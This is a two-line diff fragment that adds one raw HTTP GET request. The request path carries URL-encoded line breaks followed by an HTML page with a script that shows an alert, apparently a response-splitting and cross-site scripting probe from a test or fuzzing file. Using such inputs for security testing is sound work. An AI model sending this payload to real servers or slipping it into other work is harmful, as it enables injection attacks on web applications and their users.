@@ -1,0 +1,2 @@
+GET /%0d%0a%0d%0a%3chtml%3e%3cbody%3e%3cscript%3ealert%28%221%22%29%3c%2fscript%3e%3c%2fbody%3e%3c%2fhtml%3e HTTP/1.1
+
